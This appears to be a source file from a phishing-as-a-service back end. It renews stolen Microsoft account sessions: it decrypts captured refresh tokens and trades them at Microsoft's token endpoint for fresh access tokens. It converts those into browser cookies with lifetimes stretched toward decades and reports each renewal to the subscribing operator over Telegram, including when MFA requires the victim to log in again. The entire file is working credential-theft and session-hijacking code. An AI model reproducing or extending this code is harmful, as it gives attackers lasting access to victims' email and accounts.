const db = require('../database/connection');
const { decrypt, encrypt } = require('../utils/encrypt');
const { convertTokensToCookies } = require('./cookieconverter');
const axios = require('axios');
const config = require('../config/env');

async function runRenewalCycle() {
  const windowHours = config.RENEWAL_WINDOW_HOURS;
  const maxAttempts = config.MAX_RENEWAL_ATTEMPTS;

  // Pre-emptive renewal: renew cookies that are about to expire (within 6 hours)
  const [expiringSoon] = await db.query(
    `SELECT ct.*, u.subscription_status, u.subscription_expiry, l.template_type
     FROM captured_tokens ct
     JOIN users u ON ct.user_id = u.id
     LEFT JOIN links l ON ct.link_id = l.id
     WHERE ct.token_type = 'cookie'
       AND ct.deleted = 0
       AND ct.stale = 0
       AND ct.renewal_attempts < ?
       AND u.subscription_status = 'active'
       AND (u.subscription_expiry IS NULL OR u.subscription_expiry > NOW())
       AND ct.expiration IS NOT NULL
       AND ct.expiration < DATE_ADD(NOW(), INTERVAL 6 HOUR)`,
    [maxAttempts]
  );

  for (const capture of expiringSoon) {
    await renewSingleCapture(capture, true); // true = pre-emptive
  }

  // Regular renewal: cookies that have expired or are in renewal window
  const [expired] = await db.query(
    `SELECT ct.*, u.subscription_status, u.subscription_expiry, l.template_type
     FROM captured_tokens ct
     JOIN users u ON ct.user_id = u.id
     LEFT JOIN links l ON ct.link_id = l.id
     WHERE ct.token_type = 'cookie'
       AND ct.deleted = 0
       AND ct.stale = 0
       AND ct.renewal_attempts < ?
       AND u.subscription_status = 'active'
       AND (u.subscription_expiry IS NULL OR u.subscription_expiry > NOW())
       AND (ct.expiration IS NULL OR ct.expiration <= NOW())`,
    [maxAttempts]
  );

  for (const capture of expired) {
    await renewSingleCapture(capture, false); // false = expired
  }
}

async function renewSingleCapture(capture, isPreemptive = false) {
  try {
    const refreshToken = decrypt(capture.refresh_token_encrypted);
    if (!refreshToken) {
      await markStale(capture.id, 'No refresh token available');
      return { success: false, error: 'No refresh token' };
    }

    // Exponential backoff: wait longer if we've had recent failures
    const attemptDelay = Math.min(Math.pow(2, capture.renewal_attempts || 0) * 1000, 30000);
    if (attemptDelay > 0 && !isPreemptive) {
      await sleep(attemptDelay);
    }

    // Call Microsoft token endpoint with refresh token
    const response = await axios.post(
      `https://login.microsoftonline.com/common/oauth2/v2.0/token`,
      new URLSearchParams({
        grant_type: 'refresh_token',
        refresh_token: refreshToken,
        client_id: config.AZURE_CLIENT_ID,
        scope: 'openid profile email offline_access https://graph.microsoft.com/.default',
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const newAccessToken = response.data.access_token;
    const newRefreshToken = response.data.refresh_token || refreshToken;

    // Check for soft errors (AADSTS50076 - interaction required)
    const errorCode = response.data.error_code || response.data.error;
    if (errorCode === '50076' || errorCode === 'interaction_required' || response.data.error === 'interaction_required') {
      // Switch to device code flow for re-authentication
      await handleSoftError(capture, newAccessToken, newRefreshToken);
      return { success: false, error: 'Soft error - switched to device code flow', soft_error: true };
    }

    // Convert to cookies with multiple domain support
    const cookieResult = await convertTokensToCookies(
      newAccessToken,
      capture.template_type || 'office'
    );

    if (cookieResult.success && cookieResult.cookies) {
      // Set cookie TTL based on token expiration or default (80 years for persistence)
      const expiresIn = response.data.expires_in || 7776000; // Default 90 days in seconds
      const ttlHours = Math.min(Math.max(expiresIn / 3600, 24), 700800); // Min 24h, Max ~80 years

      await db.query(
        `UPDATE captured_tokens
         SET access_token_encrypted = ?, refresh_token_encrypted = ?,
             cookies_encrypted = ?, expiration = DATE_ADD(NOW(), INTERVAL ? HOUR),
             last_renewed = NOW(), renewal_count = renewal_count + 1,
             renewal_attempts = 0, stale = 0
         WHERE id = ?`,
        [encrypt(newAccessToken), encrypt(newRefreshToken), encrypt(cookieResult.cookies),
         ttlHours, capture.id]
      );

      // Log renewal
      await db.query(
        'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, renewal_type) VALUES (?, ?, 1, ?, ?)',
        [capture.id, capture.user_id, '127.0.0.1', isPreemptive ? 'preemptive' : 'regular']
      );

      // Notify user via Telegram
      const message = isPreemptive
        ? `⚡ Pre-emptive renewal for capture #${capture.id}`
        : `🔄 Cookies renewed for capture #${capture.id}`;
      await notifyUser(capture.user_id, message);

      return { success: true, cookies: cookieResult.cookies };
    } else {
      await handleRenewalFailure(capture, cookieResult.error);
      return { success: false, error: cookieResult.error };
    }
  } catch (err) {
    await handleRenewalFailure(capture, err.message);
    return { success: false, error: err.message };
  }
}

async function handleSoftError(capture, accessToken, refreshToken) {
  // When we get a soft error (AADSTS50076), we need to re-authenticate the user
  // This typically happens when MFA or additional verification is required
  try {
    // Store the updated tokens even though we got a soft error
    await db.query(
      `UPDATE captured_tokens
       SET access_token_encrypted = ?, refresh_token_encrypted = ?,
           renewal_attempts = renewal_attempts + 1,
           last_renewed = NOW()
       WHERE id = ?`,
      [encrypt(accessToken), encrypt(refreshToken), capture.id]
    );

    // Log the soft error
    await db.query(
      'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, error_message, renewal_type) VALUES (?, ?, 0, ?, ?, ?)',
      [capture.id, capture.user_id, '127.0.0.1', 'Soft error: AADSTS50076 - re-authentication required', 'soft_error']
    );

    // Notify user that re-authentication is needed
    await notifyUser(capture.user_id, `⚠️ Re-authentication required for capture #${capture.id}. Please log in again.`);
  } catch (err) {
    console.error('Error handling soft error:', err);
  }
}

async function handleRenewalFailure(capture, errorMessage = 'Renewal failed') {
  const newAttempts = (capture.renewal_attempts || 0) + 1;
  const maxAttempts = config.MAX_RENEWAL_ATTEMPTS;

  if (newAttempts >= maxAttempts) {
    await db.query('UPDATE captured_tokens SET stale = 1, renewal_attempts = ? WHERE id = ?', [newAttempts, capture.id]);
    await notifyUser(capture.user_id, `⚠️ Cookie renewal failed permanently for capture #${capture.id}. Marked as stale.\nError: ${errorMessage}`);
  } else {
    await db.query('UPDATE captured_tokens SET renewal_attempts = ? WHERE id = ?', [newAttempts, capture.id]);
  }

  await db.query(
    'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, error_message) VALUES (?, ?, 0, ?, ?)',
    [capture.id, capture.user_id, '127.0.0.1', `${errorMessage} (attempt ${newAttempts}/${maxAttempts})`]
  );
}

async function markStale(captureId, reason) {
  await db.query('UPDATE captured_tokens SET stale = 1 WHERE id = ?', [captureId]);
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function notifyUser(userId, message) {
  try {
    const [users] = await db.query('SELECT * FROM users WHERE id = ?', [userId]);
    if (!users.length) return;

    const user = users[0];

    // Telegram notification
    if (user.notify_prt && user.telegram_id && user.telegram_bot_token) {
      try {
        await axios.post(`https://api.telegram.org/bot${user.telegram_bot_token}/sendMessage`, {
          chat_id: user.telegram_id,
          text: message,
          parse_mode: 'HTML',
        });
      } catch (e) {
        console.error('Telegram notification failed:', e.message);
      }
    }

    // Email notification (if SMTP is configured)
    if (user.notify_login && user.email) {
      try {
        // Email notification would be implemented here if nodemailer is configured
        // For now, we'll just log it
        console.log(`Email notification for user ${userId}: ${message}`);
      } catch (e) {
        console.error('Email notification failed:', e.message);
      }
    }
  } catch (e) {
    console.error('Notification error:', e);
  }
}

// Get renewal statistics for a user
async function getRenewalStats(userId, captureId = null) {
  try {
    let query = `
      SELECT
        COUNT(*) as total_renewals,
        SUM(CASE WHEN success = 1 THEN 1 ELSE 0 END) as successful_renewals,
        SUM(CASE WHEN success = 0 THEN 1 ELSE 0 END) as failed_renewals,
        MAX(created_at) as last_renewal_attempt
      FROM cookie_renewals
      WHERE user_id = ?
    `;
    const params = [userId];

    if (captureId) {
      query += ' AND capture_id = ?';
      params.push(captureId);
    }

    const [stats] = await db.query(query, params);
    return stats[0] || {};
  } catch (err) {
    console.error('Error getting renewal stats:', err);
    return {};
  }
}

module.exports = {
  runRenewalCycle,
  renewSingleCapture,
  getRenewalStats
};
